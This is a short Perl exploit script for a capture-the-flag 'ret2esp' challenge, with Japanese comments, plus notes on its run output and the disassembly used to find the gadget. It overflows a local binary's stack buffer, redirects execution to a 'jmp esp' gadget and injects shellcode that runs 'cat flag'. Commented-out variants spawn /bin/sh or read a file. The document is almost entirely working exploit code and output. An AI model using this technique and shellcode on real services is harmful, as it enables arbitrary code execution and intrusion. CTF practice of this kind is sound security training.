# ret2esp
use lib qw (/opt/ctf/tools/ctf-tools/pwn/perl_pwntools);
use pwntools;
use Time::HiRes qw (usleep);
#$pwntools::ARCH = '64';
&connect(\$s, 'localhost', 21024) or die "ng";
$buf = "A" x (300+int($ARGV[0]));
#$buf.= p(0x80485b6). &get_sc('x86', 'sh')."\n";# /bin/sh起動のためのshellcodeを埋め込む
$buf.= p(0x80485b6). &get_sc('x86', 'execcmd', 'cat flag')."\n";# flag参照のためのshellcodeを埋め込む
#$buf.= p(0x80485b6). &get_sc('x86', 'readfile', './flag')."\n";# flag参照のためのshellcodeを埋め込む
#$a = <STDIN>;
syswrite($s, $buf, length($buf));
usleep(200000);
sysread($s, $data, 0x100); print $data;
#&interact($s);
__END__
# perl try1.pl 19
FLAG_GGGGGGGGGGGGG
$ objdump -d -Mintel bof
$ rodata2od bof
$ view bof.disas
 80485af:	c7 84 24 49 01 00 00 	mov    DWORD PTR [esp+0x149],0xd4ffe4ff
 80485b6:	ff e4 ff d4 
 80485c1:	00 54 c3 
